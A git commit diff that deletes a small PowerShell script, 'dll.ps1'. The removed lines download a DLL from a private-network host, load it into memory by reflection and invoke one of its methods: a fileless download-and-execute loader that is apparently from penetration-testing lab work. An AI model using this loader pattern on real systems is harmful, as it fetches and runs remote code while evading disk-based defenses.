32c88f8c37cfcabfe5a8ff4f321624d1f1efd767
Red Meow <44439821+aifred0729-TW@users.noreply.github.com>
2023-04-27 04:13:15 +0800

    Delete dll.ps1

--- dll.ps1
+++
@@ -1,5 +0,0 @@
-$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.125/word.dll')
-$assem = [System.Reflection.Assembly]::Load($data)
-$class = $assem.GetType("word.Writer")
-$method = $class.GetMethod("author")
-$method.Invoke(0, $null)
